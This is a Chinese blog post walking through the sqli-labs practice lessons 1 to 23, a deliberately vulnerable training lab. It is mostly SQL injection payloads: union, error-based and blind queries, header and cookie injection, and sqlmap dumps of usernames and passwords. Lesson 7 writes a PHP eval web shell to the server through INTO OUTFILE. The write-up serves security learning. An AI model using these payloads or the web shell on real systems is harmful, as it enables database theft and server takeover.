---
layout:     post
title:      sqli-labs合集
subtitle:   SQL注入漏洞
date:       2020-11-13
author:     heria
header-img: img/post-bg-kuaidi.jpg
catalog: true
tags:
---



## 0X00sqli-labs环境搭建

docker搭建环境

docker search sqli-labs

![image-20201110131548214](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110131548214.png)

docker pull docker.io/acgpiano/sqli-labs

docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs

![image-20201110131632980](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110131632980.png)

![image-20201110131748679](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110131748679.png)

![image-20201110131812477](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110131812477.png)

![image-20201110131826300](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110131826300.png)

![image-20201110131838555](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110131838555.png)

## 0X01Less-1

**Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)**

![image-20201110131951339](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110131951339.png)

```
?id=1  //正常
```

![image-20201110132631071](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110132631071.png)

```
?id=1'  //报错
```

![image-20201110132708311](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110132708311.png)

```
?id=1' or '1'='1  //正常
```

![image-20201110132507185](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110132507185.png)

根据报错信息，可以确定输入参数的内容被存放到一对单引号中间

单引号闭合 

```
?id=1' order by 3 %23  //正常
?id=1' order by 4 %23   //报错

SQL注入过程中注释符号有以下几种表达方式：
--+
#
%23
```

![image-20201110133335061](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110133335061.png)

![image-20201110133531856](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110133531856.png)

判断字段数为3



union查询

```
?id=1' and 1=2 union select 1,2,3 --+  #显示位为2，3
```

![image-20201110134014006](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110134014006.png)

```
?id=1' and 1=2 union select 1,version(),database() --+
```

![image-20201110134116338](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110134116338.png)

这里给出union联合查询的使用方法:

```
查数据库名：select database()   // 
查询所有数据库名：union SELECT group_concat(schema_name),2 FROM INFORMATION_SCHEMA.SCHEMATA

爆出所有数据库：SELECT group_concat(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA

查数据库名为fanke下面的表名(16进制编码)：union select 1,table_name,3,4,5 from information_schema.tables where table_schema=0x66616E6B65
information_schema.tables：存储mysql数据库下面的所有表名信息的表
table_schema：数据库名
Table_name：表名

查user表名下的列名信息：union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=0x75736572
column_name：列名
information_schema.columns ：存储mysql数据库下面的所有列名信息的表
table_name：表名

查user表名下列名username,password的数据：
union select 1,username,password,4,5 from user
```

查看所有数据库名

![image-20201110134351380](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110134351380.png)

查询security内的所有表名

```
?id=1' AND 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
```

![image-20201110134659034](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110134659034.png)

暴列名

```
?id=1' AND 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') --+
```

![image-20201110134848725](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110134848725.png)

爆用户名和密码

```
?id=1' AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+
```

![image-20201110134954999](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110134954999.png)



sqlmap 

```
sqlmap.py -u "http://119.45.55.187/Less-1/?id=1"
```

![image-20201110140638528](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110140638528.png)

```
sqlmap.py -u "http://192.168.29.76/sqli-labs-master/Less-1/?id=1" --dbs
```

![image-20201110140714198](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110140714198.png)

```
sqlmap.py -u "http://119.45.55.187/Less-1/?id=1" -D security --tables
```

![image-20201110140954381](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110140954381.png)

```
sqlmap.py -u "http://119.45.55.187/Less-1/?id=1" -D security  -T users --columns
```

![image-20201110141155939](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110141155939.png)

```
sqlmap.py -u "http://119.45.55.187/Less-1/?id=1" -D security  -T users -C username,password --dump
```

![image-20201110141335938](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110141335938.png)



## 0X02Less-2

**Error based - Intiger based (基于错误的GET整型注入)**

数字型注入

```
?id=1 and 1=1  //正常
```

![image-20201110141655754](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110141655754.png)

```
?id=1 and 1=2  //报错
```

order by 确定字段长度为3

![image-20201110142055605](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110142055605.png)

![image-20201110142035864](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110142035864.png)



union 爆破

![image-20201110142221789](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110142221789.png)

![image-20201110142746790](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110142746790.png)

```
?id=1 and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
```

![image-20201110143000912](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110143000912.png)

```
?id=1' AND 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users') --+
```

![image-20201110143117098](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110143117098.png)

```
?id=1' AND 1=2 union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) --+
```

![image-20201110143305931](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110143305931.png)



## 0X03Less-3

GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)

```
?id=1  //正常
```

![image-20201110143538742](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110143538742.png)

```
？id=1’  //报错  根据报错可以知道需要闭合（）
```

![image-20201110143616165](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110143616165.png)

？id=1') order by 3 --+ 判断字段长  后续步骤同 1、2

![image-20201110143757067](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110143757067.png)



## 0X04Less-4

GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）

?id=1'  页面正常显示

?id=1" 报错   根据报错信息 判断输入的内容被放到一对双引号和括号内

![image-20201110144105850](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110144105850.png)

后续步骤相同

![image-20201110144446724](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110144446724.png)



sqlmap

![image-20201110144707397](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110144707397.png)

## 0X05Less-5

Double Injection - Single Quotes - String (双注入GET单引号字符型注入)

法一

时间延迟型手工注入

时间延迟型手工注入，正确会延迟，错误没有延迟。id无所谓，又不看回显，可以通过浏览器的刷新提示观察延迟情况，但是id正确的时候的回显有利于观察。



爆库长payload   length(database())=8 明显延迟

```
?id=1' and if(length(database())=8,sleep(5),1)--+
```



```
?id=1' and if(left(database(),1)='s',sleep(5),1)--+
```

明显延迟，数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)='security'

![image-20201110150059302](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110150059302.png)

```
爆表名
?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 3,1),1)='u' ,sleep(5),1)--+
```

![image-20201110151619242](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110151619242.png)

```
?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 3,1),2)='us' ,sleep(5),1)--+

?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users' ,sleep(5),1)--+
```

爆列名

```
?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+
```

爆破值payload

```
?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+
```

 法2：

报错注入

(1). 通过floor报错
and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)
其中payload为你要插入的SQL语句
需要注意的是该语句将 输出字符长度限制为64个字符

(2). 通过updatexml报错
and updatexml(1,payload,1)
同样该语句对输出的字符长度也做了限制，其最长输出32位
并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效

(3). 通过ExtractValue报错
and extractvalue(1, payload)
输出字符有长度限制，最长32位





```
?id=1' and 1=(updatexml(1,concat(0x3a,(select database())),1))%23
```

![image-20201110152452359](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110152452359.png)

法三

**使用concat聚合函数**

```
?id=1' union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+
```

![image-20201110152821080](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110152821080.png)

```
?id=1' union select null,count(*),concat((select column_name from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23
```



法四

sqlmap

## 0X06Less-06

**Double Injection - Double Quotes - String (双注入GET双引号字符型注入)**

双引号字符型注入，上一题的单引号改成双引号就可以了,同样是两种方法：时间延迟型的手工盲注、报错型的手工盲注或者sqlmap，再有利用concat()几聚合数。

步骤和第五题一样，不再赘述。



## 0X07Less-07

**Dump into outfile - String （导出文件GET字符型注入）**

![image-20201110153908990](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110153908990.png)

提示使用outfile

![image-20201110154031196](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110154031196.png)

**小扩展：**

winserver的iis默认路径c:\Inetpub\wwwroot

linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等

apache 就.../var/www/htm，.../var/www/html/htdocs

phpstudy 就是...\PhpStudy20180211\PHPTutorial\WWW\

xammp 就是...\xampp\htdocs

payload 通过先前的关卡知道绝对路径

```
Less-2/?id=-1 union select 1,@@basedir,@@datadir --+
```

![image-20201110154240689](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110154240689.png)

show variables like '%secure%';

![image-20201110160234846](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110160234846.png)

`secure_file_priv`这个参数用来限制数据导入和导出操作的效果，例如执行`load data`、`into outfile`语句和`load_file()`函数,这些操作需要用户具有`file`权限。

> **1**. 如果这个参数为空，这个变量没有效果。
>  **2**. 如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它.
>  **3**. 如果这个参数为`null`，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。
>
> 

![image-20201110162137375](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162137375.png)

原因 对应文件无写入权限

chmod 后

![image-20201110162304403](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162304403.png)

测试写入文件

```
?id=1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "\/var\/www\/html\/test.php"--+
```

![image-20201110162613365](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162613365.png)

![image-20201110162638339](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162638339.png)

![image-20201110162654973](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162654973.png)

![image-20201110162802091](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162802091.png)

蚁剑连接getshell

![image-20201110162742052](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162742052.png)

![image-20201110162749225](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110162749225.png)

## 0X08Less-08

**Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)**

http://119.45.55.187/Less-8/?id=1  //正常

http://119.45.55.187/Less-8/?id=1' //错误

http://119.45.55.187/Less-8/?id=1'--+ //正常

方法一

**二分法-爆库**

?id=1' and left((select database()),1)<'m'--+无回显说明错误
![image-20201110164402825](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110164402825.png)

?id=1' and left((select database()),1)<'t'--+ 回显 说明正确
![image-20201110164456561](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110164456561.png)

使用类似方法，逐位查找库名的每一位，得到库名为`security`

**爆表**

利用类似上面的二分法，不断改变`limit`字段的参数（前一个参数表示从第几位开始，后一个表示共返回几个记录）及字符串截取函数`left`的参数（其表示截取从左边计算共几位）

(使用二分法)依次判断第一位

```
?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' *--+*
```

直到爆出完整表名

```
?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),7)='referers' --+
```

**爆列名(以`user`表为例)**

爆破第二个列名时

> ?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 1,1),5)='first' *--+*

有回显说明正确

在判断第一个的第六位，只在判断`>'z'`时有回显

> ?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 1,1),6)>'firstz' --+

**（MySQL对大小写不敏感）故**

**第六个字符应该是符号**

> ?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 1,1),6)='first_' --+

有回显

![image-20201008193653016](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/20201008201803.png)

（从0开始计数）最后得到第二个字段名为`first_name`,第三个字段为`last_name`,第四个为`user`,第五个为`password`

![image-20201008194004605](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/20201008201804.png)

**记录爆破(以`passowrd、user`字段为例)**

> ?id=1' and left((select password from users order by id limit 0,1),1)='d' --+

![image-20201008200218268](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/20201008201805.png)

得到第一个用户名为`dumb`,第一个密码也是`dumb`

方法二 时间延迟型

同Less-5

## 0X09Less-09

**GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)**

不管怎么输入，回显总是you are ...

![image-20201110165514164](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110165514164.png)

考虑时间盲注

存在延时

![image-20201110165615569](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110165615569.png)

爆库payload

```
?id=1' and if(length(database())=4 , sleep(3), 1) --+
```

发现当?id=1' and if(length(database())=8 , sleep(3), 1) --+时明显延迟，所以库名长为8

```
?id=1' and if(left(database(),1)='s' , sleep(3), 1) --+
```

发现明显延迟说明库名第一个字符为 's'

继续爆破?id=1' and if(left(database(),8)='security' , sleep(3), 1) --+

说明库名为 'security'

爆表payload

```
?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' , sleep(3), 1) --+
```

使用limit x,1 查询第x个表名，和爆破库名一样，第一个表名为referer。终于，在第三个表爆到users这个表，显然是用户信息表。

爆字段payload

定向爆破password和username，这里就不解释了，第五题里面写的比较详细了。

```
?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password', sleep(3), 1) --+
?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 9,1),8)='username', sleep(3), 1) --+
```

我在第4，9行分别爆破到password和username，个人环境不同的可能表位置有差别。

爆值payload

```
?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb' , sleep(3), 1) --+
?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb' , sleep(3), 1) --+
```

爆破到第一个人的username：dumb，password：dumb。修改limit x,1 继续爆破其他用户，手工注入比较慢，可以使用sqlmap。

## 0X0ALess-10

**GET - Blind - Time based - double quotes (基于时间的双引号盲注)**

基于时间的双引号盲注，只要把上一题Less-9的单引号改成双引号，一样的注入



## 0X0BLess-11

**POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)**

```
1、通过floor报错,注入语句如下:and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
2、通过ExtractValue报错,注入语句如下:and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
3、通过UpdateXml报错,注入语句如下:and 1=(updatexml(1,concat(0x3a,(select user())),1))
4、通过NAME_CONST报错,注入语句如下:and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
5、通过join报错,注入语句如下:select * from(select * from mysql.user ajoin mysql.user b)c;
6、通过exp报错,注入语句如下:and exp(~(select * from (select user () ) a) );
7、通过GeometryCollection()报错,注入语句如下:and GeometryCollection(()select *from(select user () )a)b );
8、通过polygon ()报错,注入语句如下:and polygon (()select * from(select user ())a)b );
9、通过multipoint ()报错,注入语句如下:and multipoint (()select * from(select user() )a)b );
10、通过multlinestring ()报错,注入语句如下:and multlinestring (()select * from(selectuser () )a)b );
11、通过multpolygon ()报错,注入语句如下:and multpolygon (()select * from(selectuser () )a)b );
12、通过linestring ()报错,注入语句如下:and linestring (()select * from(select user() )a)b );
```

爆库payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select database()))) --+&passwd=admin&submit=Submit
```

爆表payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+&passwd=admin&submit=Submit
```

只能查询到前几个表，后面加上not in ()就可以查到其他表了，如：

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not in ('emails')))) --+&passwd=admin&submit=Submit
```

这里我们发现没有更多的表了，而users表应该是存放用户信息的，所以我们进入下一步。

爆列名payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+&passwd=admin&submit=Submit
```

使用同样方法，可以查询到其他列名，直到遍历出所有列名，我们找到password和uername，开始爆值。

爆值payload

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+&passwd=admin&submit=Submit
```

同样使用not in 可以查询其他值：

```
uname=admin' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you'))))--+&passwd=admin&submit=Submit
```

![image-20201110170257383](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110170257383.png)

通过单引号加注释绕过

![image-20201110170720666](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110170720666.png)

字段长度为2

![image-20201110170805915](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110170805915.png)

通过报错回显爆出数据库名

![image-20201110170943970](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110170943970.png)

```
uname=admin'and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security' )# &passwd=1
```

![image-20201110171251151](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110171251151.png)

后续同Less-01



```
uname=admin'and 1=(updatexml(1,concat(0x3a,(select user())),1))#&passwd=1
```

![image-20201110171509978](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110171509978.png)





sqlmap

抓包保存到文件 sqlmap指定文件

![image-20201110171757747](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110171757747.png)

sqlmap.py -r "c:\Users\fendo\Desktop\post.txt"  --dbs

![image-20201110172450201](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110172450201.png)

后续相同

## 0X0CLess-12

**POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)**

![img](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/20180822112455820)

可以看到sql查询语句：

@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";

构造一个能闭合语句而且会报错的payload：

admin" and extractvalue(1,concat(0x7e,(select database()))) and " 

最终admin = "admin" and extractvalue(1,concat(0x7e,(select database()))) and " "

传入后就变成了：

```
@$sql="SELECT username, password FROM users WHERE username="admin"  and extractvalue(1,concat(0x7e,(select database())))  and " " and password=($passwd) LIMIT 0,1";
```

![image-20201110173648940](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110173648940.png)

下来就再concat()中构造查询语句：

爆库payload

```
uname=admin" and extractvalue(1,concat(0x7e,(select database())))  and " &passwd=admin&submit=Submit
```

爆表payload

```
uname=admin"  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and "  &passwd=admin&submit=Submit
```

爆列payload

```
uname=admin"  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')))  and "  &passwd=admin&submit=Submit
```

同样使用not in查询没有显示出的其他值。

爆值payload

```
uname=admin"  and extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users)))  and "  &passwd=admin&submit=Submit
```



法二 联合查询

![image-20201110174205614](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110174205614.png)

和之前一样



## 0X0DLess-13

**POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)**

通过报错提示可看出通过’）闭合，但无登陆成功返回信息

![image-20201110175214006](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110175214006.png)

方法一，报错型

既然它返回错误信息了，说明有回显，可以报错注入。

样例payload

```
uname=admin') and extractvalue(1,concat(0x7e,(select database()))) #
```

![image-20201110175446491](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110175446491.png)

uname=admin')  and extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users))) # &passwd=admin&submit=Submit

![image-20201110175552861](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110175552861.png)

在concat()中构造查询语句，完事，和less-12以及之前的报错型注入一样，不再赘述。

方法二，时间型盲注

因为可以报错注入，这个方法没有回显，就有点鸡肋了，给个样例payload：

```
uname=admin') and if(left(database(),1)='s',sleep(3),1) --+&passwd=admin&submit=Submit
```

这就又和之前的一样了 通过延时判断

![image-20201110175807948](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110175807948.png)



## 0X0ELess-14

双引号 报错

![image-20201110180347069](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110180347069.png)

方法一，报错型

样例payload

```
uname=admin" and extractvalue(1,concat(0x7e,(select database()))) and "  &passwd=admin&submit=Submit
```

 ![image-20201110180511346](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201110180511346.png)

后续同之前一样

方法二，时间型盲注

效率低，鸡肋

样例payload

```
uname=admin" and if(left(database(),1)='s',sleep(3),1) --+ &passwd=admin&submit=Submit
```

方法三，聚合函数

具有随机性，鸡肋

样例payload

```
uname= " union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &passwd=admin&submit=Submit
```



## 0X0FLess-15

```
uname=admin' and 1=1 --+&passwd=admin&submit=Submit    //登陆成功
uname=admin' and 1=2 --+&passwd=admin&submit=Submit    //登录失败
```



存在延时注入

![image-20201111091910211](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111091910211.png)

爆库，表，列名，值，

```
uname=admin' and if(length(database())=8,sleep(5),1)--+&passwd=admin&submit=Submit

uname=admin' and if(left(database(),1)='s',sleep(5),1)--+&passwd=admin&submit=Submit

uname=admin' and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r' ,sleep(5),1)--+&passwd=admin&submit=Submit

uname=admin' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='password' ,sleep(5),1)--+&passwd=admin&submit=Submit

uname=admin' and if(left((select password from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit

uname=admin' and if(left((select username from users order by id limit 0,1),4)='dumb' ,sleep(5),1)--+&passwd=admin&submit=Submit
```



## 0X10Less-16

“）闭合 其他和Less-15一样  （无报错回显，采用时间延迟注入）

![image-20201111093559168](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111093559168.png)

万能账号绕过密码验证：admin")#

## 0X11Less-17

```
function check_input($value)
	{
	if(!empty($value))
		{
		// truncation (see comments)
		$value = substr($value,0,15);
		}

​		// Stripslashes if magic quotes enabled
​		if (get_magic_quotes_gpc())
​			{
​			$value = stripslashes($value);
​			}

​		// Quote if not a number
​		if (!ctype_digit($value))
​			{
​			$value = "'" . mysql_real_escape_string($value) . "'";
​			}
​		
​	else
​		{
​		$value = intval($value);
​		}
​	return $value;
​	}

// take the variables
if(isset($_POST['uname']) && isset($_POST['passwd']))

{
//making sure uname is not injectable
$uname=check_input($_POST['uname']);  
$passwd=$_POST['passwd'];

// connectivity 
@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
```

查看源码username字段无法绕过

测试uname=admin &passwd=1'时有报错回显

![image-20201111095903302](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111095903302.png)

判断单引号’闭合，使用报错注入

![image-20201111095716979](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111095716979.png)

爆库payload（）

```
uname=admin and  &passwd=admin‘ extractvalue(1,concat(0x7e,(select database())))  #&submit=Submit
```

爆表payload

```
uname=admin&passwd=admin' extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #&submit=Submit
```

爆列payload

```
uname=admin &passwd=admin' extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) #&submit=Submit
```

同样使用not in查询没有显示出的其他值。

爆值payload

```
uname=admin &passwd=admin' extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users))) #  &submit=Submit
```



## 0X12Less-18

```
$uname = check_input($_POST['uname']);  
$passwd = check_input($_POST['passwd']);
```

uname和passwd都进行了过滤，在这里进行注入是行不通的。

```
$uagent = $_SERVER['HTTP_USER_AGENT'];  
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

看到 insert语句，他把user-agent插入到了数据库，所以可以从这里下手，而且看的出来是单引号型，接下来开始爆破

![image-20201111105010705](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111105010705.png)

注入失败，添加后依旧无报错回显(大概率环境问题)

![image-20201111105149565](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111105149565.png)



## 0X13Less-19

同18， 注入点在referer字段，同样注入失败

## 0X14Less-20

通过cookie字段添加payload完成注入  报错注入

![image-20201111110718557](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111110718557.png)

orderby 联合查询注入

uname=' order by 4 #；

![image-20201111112330422](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111112330422.png)



## 0X15Less-21

```
$cookee` `= ``$_COOKIE``[``'uname'``];
``$cookee` `= ``base64_decode``(``$cookee``);
``$sql``=``"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1"``;
``die``(``'Issue with your mysql: '` `. mysql_error());
```

相比Less-20进行了base-64处理，因此在20基础上将payload进行base64编码后添加到cookie处即可



## 0X16Less-22

![image-20201111113115305](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111113115305.png)

在21基础上多了一重 "闭合

base编码

![image-20201111113742316](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111113742316.png)



![image-20201111113721591](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111113721591.png)

```
admin" and extractvalue(1,concat(0x7e,(select group_concat(username,'~',password) from users))) #
```

编码

```
YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSwnficscGFzc3dvcmQpIGZyb20gdXNlcnMpKSkgIw==
```

![image-20201111114008305](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111114008305.png)



## 0X17Less-23

![image-20201111131931936](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111131931936.png)

去注释符

构造payload

爆库payload

```
?id=' union select 1,2,database() '
```

爆表payload

```
?id=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'= '
```

爆列名payload

```
?id=' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' or '1'= '
```

爆值payload

```
?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '
```

 **此处的sql语句为**

SELECT * FROM users WHERE id='-**1' union select 1,(select database()),'3**' limit 0,1

![image-20201111131840712](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111131840712.png)

Explain：此处讲解几个知识点：

1、id=-1，为什么要用-1，因为sql语句执行了两个select语句，第一个select为id的选择语句，第二个为我们构造的select语句。只有一个数据可以输出，为了让我们自己构造的数据可以正常输出，第一个select要没有结果，所以-1或者超过数据库所有数据都可以。

2、**-1' union select 1,(select database()),'3，**第一个'（单引号）闭合-1，第二个'（单引号）闭合后面的。这样将查询内容显示在username处。

3、此处可以报错注入，延时注入，可以利用or '1'='1进行闭合。http://127.0.0.1/sql/Less-23/index.php?id=-1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1

以上这条语句就是利用extractvalue()进行报错注入。

![image-20201111132449786](https://raw.githubusercontent.com/heriachen/cloudimg/main/img/image-20201111132449786.png)



